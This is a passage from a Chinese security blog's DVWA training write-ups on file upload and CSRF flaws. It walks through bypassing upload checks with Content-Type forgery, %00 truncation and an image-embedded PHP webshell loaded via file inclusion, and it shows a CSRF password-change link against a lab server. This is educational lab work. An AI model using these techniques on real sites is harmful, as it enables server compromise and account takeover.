];</span><br><span class="line">$uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ];</span><br><span class="line"></span><br><span class="line">// Is it an image?</span><br><span class="line">if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp;</span><br><span class="line">( $uploaded_size &lt; 100000 ) ) &#123;</span><br><span class="line"></span><br><span class="line">// Can we move the file to the upload folder?</span><br><span class="line">if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) &#123;</span><br><span class="line">// No</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Yes!</span><br><span class="line">echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Invalid file</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>这里采用白名单过滤只允许上传文件的 MIME类型为image/jpeg或者image/png以及文件大小小于100000字节。</p><p><strong>1.用burp更改content-type就行</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105419722.png" alt></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105455843.png" alt></p><p><strong>2.截断绕过规则</strong></p><p>在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断，所以可以把上传文件命名为<code>muma.php%00.png</code>。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105520655.png" alt></p><p>而服务器会认为其文件名为hack.php，顺势解析为php文件。（仅限于php版本小于5.3.4的版本）</p><h2 id="High-难度"><a href="#High-难度" class="headerlink" title="High 难度"></a>High 难度</h2><p><strong>源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;Upload&apos; ] ) ) &#123;</span><br><span class="line">// Where are we going to be writing to?</span><br><span class="line">$target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;</span><br><span class="line">$target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">// File information</span><br><span class="line">$uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ];</span><br><span class="line">$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1);</span><br><span class="line">$uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ];</span><br><span class="line">$uploaded_tmp = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ];</span><br><span class="line"></span><br><span class="line">// Is it an image?</span><br><span class="line">if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp;</span><br><span class="line">( $uploaded_size &lt; 100000 ) &amp;&amp;</span><br><span class="line">getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">// Can we move the file to the upload folder?</span><br><span class="line">if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;</span><br><span class="line">// No</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Yes!</span><br><span class="line">echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Invalid file</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>substr(string,start,length)返回字符串的一部分。<br>strrpos()查找第二个参数在第一个参数中最后一次出现的位置<br>$uploaded_ext等于文件的后缀名<br>getimagesize(string filename)函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。</p><p>仍然采用白名单过滤，只允许上传的文件后缀名为jpg，jpeg，png以及文件大小小于100000字节。getimagesize函数限制了上传文件的文件头必须为图像类型。</p><p><strong>1.采用%00截断</strong></p><p>需要将上传文件的文件头伪装成图片。常见的图片格式的文件头标识如下：</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105646521.png" alt></p><p>用copy将一句话木马文件php.php与图片文件1.jpg合并</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105655457.png" alt></p><p>记事本打开可以发现一句话木马藏在了图片里</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105706497.png" alt></p><p><strong>绕过后缀检查</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105736015.png" alt></p><p>然后需要用到文件包含漏洞。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.128/DVWAmaster/vulnerabilities/fi/?page=file:///var/www/html/DVWA-master/hackable/uploads/muma.jpg</span><br></pre></td></tr></table></figure></p><p>在文件包含漏洞页面成功加载图片</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105813536.png" alt></p><p>然后用菜刀，地址栏填上面的url，参数名 <code>haha</code>,</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105831914.png" alt></p><p>连接失败，cookie里会有两个相同的参数，导致访问失败。wirteup上说是DVWA的BUG</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105900625.png" alt></p><p>%00 截断需要 PHP&lt;5.3.4，实验环境为 5.6.35 所以无法利用。</p><h2 id="impossible难度"><a href="#impossible难度" class="headerlink" title="impossible难度"></a>impossible难度</h2><p><strong>源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;Upload&apos; ] ) ) &#123;</span><br><span class="line">// Check Anti-CSRF token</span><br><span class="line">checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line">// File information</span><br><span class="line">$uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ];</span><br><span class="line">$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1);</span><br><span class="line">$uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ];</span><br><span class="line">$uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ];</span><br><span class="line">$uploaded_tmp = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ];</span><br><span class="line"></span><br><span class="line">// Where are we going to be writing to?</span><br><span class="line">$target_path = DVWA_WEB_PAGE_TO_ROOT . &apos;hackable/uploads/&apos;;</span><br><span class="line">//$target_file = basename( $uploaded_name, &apos;.&apos; . $uploaded_ext ) . &apos;-&apos;;</span><br><span class="line">$target_file = md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext;</span><br><span class="line">$temp_file = ( ( ini_get( &apos;upload_tmp_dir&apos; ) == &apos;&apos; ) ? ( sys_get_temp_dir() ) : ( ini_get( &apos;upload_tmp_dir&apos; ) ) );</span><br><span class="line">$temp_file .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext;</span><br><span class="line"></span><br><span class="line">// Is it an image?</span><br><span class="line">if( ( strtolower( $uploaded_ext ) == &apos;jpg&apos; || strtolower( $uploaded_ext ) == &apos;jpeg&apos; || strtolower( $uploaded_ext ) == &apos;png&apos; ) &amp;&amp;</span><br><span class="line">( $uploaded_size &lt; 100000 ) &amp;&amp;</span><br><span class="line">( $uploaded_type == &apos;image/jpeg&apos; || $uploaded_type == &apos;image/png&apos; ) &amp;&amp;</span><br><span class="line">getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span><br><span class="line">if( $uploaded_type == &apos;image/jpeg&apos; ) &#123;</span><br><span class="line">$img = imagecreatefromjpeg( $uploaded_tmp );</span><br><span class="line">imagejpeg( $img, $temp_file, 100);</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">$img = imagecreatefrompng( $uploaded_tmp );</span><br><span class="line">imagepng( $img, $temp_file, 9);</span><br><span class="line">&#125;</span><br><span class="line">imagedestroy( $img );</span><br><span class="line"></span><br><span class="line">// Can we move the file to the web root from the temp folder?</span><br><span class="line">if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123;</span><br><span class="line">// Yes!</span><br><span class="line">echo &quot;&lt;pre&gt;&lt;a href=&apos;$&#123;target_path&#125;$&#123;target_file&#125;&apos;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// No</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Delete any temp files</span><br><span class="line">if( file_exists( $temp_file ) )</span><br><span class="line">unlink( $temp_file );</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Invalid file</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>uniqid() 函数基于以微秒计的当前时间，生成一个唯一的 ID。由于基于系统时间，通过该函数生成的 ID 不是最佳的。如需生成绝对唯一的 ID，需使用 md5() 函数。</p><p>ini_get — 获取一个配置选项的值。<br>upload_tmp_dir上传文件的临时目录。<br>sys_get_temp_dir — 返回用于临时文件的目录。<br>DIRECTORY_SEPARATOR是一个返回跟操作系统相关的路径分隔符内置命令，在windows上返回\，而在linux或者类unix上回/。<br>imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像。<br>（ imagecreatefrom<em>，会检查图片规范，验证图片合法性，以此抵御图片中含有恶意 php 代码的攻击。）<br>php imagecreatefrom</em> 系列函数之 png – janes。<br>imagejpeg(a,b,c) 从 image 图像以 b为文件名创建一个JPEG 图像,c为文件质量1-100，默认约为75。<br>PHP getcwd() 函数获取当前工作目录。<br>file_exists() 函数检查文件或目录是否存在。<br>unlink() 函数删除文件。<br>impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;DVWA学习（七）文件上传漏洞&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://archimesan.me/categories/CTF/"/>
    
      <category term="DVWA" scheme="http://archimesan.me/categories/CTF/DVWA/"/>
    
    
      <category term="DVWA" scheme="http://archimesan.me/tags/DVWA/"/>
    
  </entry>
  
  <entry>
    <title>DVWA学习（六）CSRF</title>
    <link href="http://archimesan.me/2018/05/22/DVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%85%AD%EF%BC%89CSRF/"/>
    <id>http://archimesan.me/2018/05/22/DVWA学习（六）CSRF/</id>
    <published>2018-05-22T13:05:23.000Z</published>
    <updated>2019-03-27T01:11:02.877Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>DVWA学习（六）CSRF<br><a id="more"></a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>CSRF(Cross-site request forgery)<br>CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。</p><p>CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。在2013年发布的新版OWASP Top 10中，CSRF排名第8。</p><h2 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h2><p><strong>源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_GET[ &apos;Change&apos; ] ) ) &#123;</span><br><span class="line">// Get input</span><br><span class="line">$pass_new = $_GET[ &apos;password_new&apos; ];</span><br><span class="line">$pass_conf = $_GET[ &apos;password_conf&apos; ];</span><br><span class="line"></span><br><span class="line">// Do the passwords match?</span><br><span class="line">if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">// They do!</span><br><span class="line">$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">// Update the database</span><br><span class="line">$insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">// Feedback for the user</span><br><span class="line">echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Issue with passwords matching</span><br><span class="line">echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>只要参数<code>password_new=password_conf</code>，服务器就会修改密码。<br>所以只要构造payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.128/DVWA-master/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;change=change</span><br></pre></td></tr></table></figure></p><p>只要cookie存在，点击这个链接之后密码就会被修改。<br>需要注意的是，CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。</p><p>如果觉得网址太明显了可以用缩短网址</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（六）CSRF/20190326090755406.png" alt></p><p>虽然利用了短链接隐藏url，但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也并不高明。所以我们可以构造攻击页面，让受害者去访问这个页面然后自动访问该链接<br>我们在ububtu服务器根目录创建文件123.html</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（六）CSRF/20190326090815342.png" alt></p><p>现在用外部主机访问该文件</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（六）CSRF/20190326090828170.png" alt></p><p>重新登陆显示密码错误，而用123登陆显示成功</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（六）CSRF/20190326090847564.png" alt></p><h2 id="Medium难度"><a href="#Medium难度" class="headerlink" title="Medium难度"></a>Medium难度</h2><p><strong>源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_GET[ &apos;Change&apos; ] ) ) &#123;</span><br><span class="line">// Checks to see where the request came from</span><br><span class="line">if( stripos( $_SERVER[ &apos;HTTP_REFERER&apos; ] ,$_SERVER[ &apos;SERVER_NAME&apos; ]) !== false ) &#123;</span><br><span class="line">// Get input</span><br><span class="line">$pass_new = $_GET[ &apos;password_new&apos; ];</span><br><span class="line">$pass_conf = $_GET[ &apos;password_conf&apos; ];</span><br><span class="line"></span><br><span class="line">// Do the passwords match?</span><br><span class="line">if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">// They do!</span><br><span class="line">$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">// Update the database</span><br><span class="line">$insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">// Feedback for the user</span><br><span class="line">echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Issue with passwords matching</span><br><span class="line">echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Didn&apos;t come from a trusted source</span><br><span class="line">echo &quot;&lt;pre&gt;That request didn&apos;t look correct.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><code>$_SERVER[&#39;HTTP_REFERER&#39;] //</code>链接到当前页面的前一页面的 URL 地址。<br><code>$_SERVER[&#39;SERVER_NAME&#39;] //</code>服务器主机的名称。</p><p>1.通常情况：<br><code>_SERVER[&quot;HTTP_HOST&quot;]</code>在HTTP/1.1协议规范下，会根据客户端的HTTP请求输出信息。<br><code>_SERVER[&quot;SERVER_NAME&quot;]</code> 默认情况下直接输出apache的配置文件httpd.conf中的ServerName值。</p><p>2.当服务器为非80端口时：<br><code>_SERVER[&quot;HTTP_HOST&quot;]</code> 会输出端口号，例如：<code>mimiz.cn:8080</code><br><code>_SERVER[&quot;SERVER_NAME&quot;]</code> 会直接输出ServerName值<br>因此在这种情况下，可以理解为：<br><code>HTTP_HOST = SERVER_NAME : SERVER_PORT</code></p><p>Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，即要访问的主机名），希望通过这种机制抵御CSRF攻击。</p><p>Host：客户端指定自己想访问的http服务器的域名/IP 地址和端口号。<br><a href="https://link.jianshu.com/?t=https://blog.csdn.net/s1234567_89/article/details/51139864" target="_blank" rel="noopener">http头中的host字段详解</a></p><p>Referer：是 HTTP 请求header 的一部分，当浏览器（或者模拟浏览器行为）向web 服务器发送请求的时候，头信息里有包含 Referer 。比如我在<code>www.sojson.com</code> 里有一个<code>www.baidu.com</code> 链接，那么点击这个<code>www.baidu.com</code> ，它的header 信息里就有：<br><code>Referer=http://www.sojson.com</code><br>也就是说请求源referer中必须包含有host主机名才可以请求改密成功。</p><p>现在我把本地服务器当作攻击者的服务器，虚拟机ubuntu的服务器为用户想要改密的网站服务器。当我访问123.html中的恶意网址时，referer等于攻击者的域名<code>127.0.0.1</code>，host为恶意网址请求的主机名<code>192.168.86.128</code></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（六）CSRF/20190326091258533.png" alt></p><p>此时是不会请求成功的。但是攻击者服务器的恶意文件名可以等于改密网站的主机名。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（六）CSRF/20190326091309711.png" alt></p><p>现在用户访问恶意网站的时候抓包查看</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（六）CSRF/20190326091321314.png" alt></p><p>refere是包含host的，所以是可以改密码成功的。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（六）CSRF/20190326091330946.png" alt></p><h2 id="High难度"><a href="#High难度" class="headerlink" title="High难度"></a>High难度</h2><p><strong>源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_GET[ &apos;Change&apos; ] ) ) &#123;</span><br><span class="line">// Check Anti-CSRF token</span><br><span class="line">checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line">// Get input</span><br><span class="line">$pass_new = $_GET[ &apos;password_new&apos; ];</span><br><span class="line">$pass_conf = $_GET[ &apos;password_conf&apos; ];</span><br><span class="line"></span><br><span class="line">// Do the passwords match?</span><br><span class="line">if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">// They do!</span><br><span class="line">$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">// Update the database</span><br><span class="line">$insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">// Feedback for the user</span><br><span class="line">echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Issue with passwords matching</span><br><span class="line">echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（六）CSRF/20190326091407576.png" alt></p><p>绕过需要获取页面的token，但是由于浏览器是不允许跨域请求的，域名A是不允许获取域名B页面中的内容的。除非域名A下的页面主动发送信息给域名B的页面，所以我们的攻击脚本是不可能取到改密界面中的user_token。<br>所以我们需要利用该网站的XSS漏洞协助获取token。<br><figure class="highlight plain"><table><tr><td 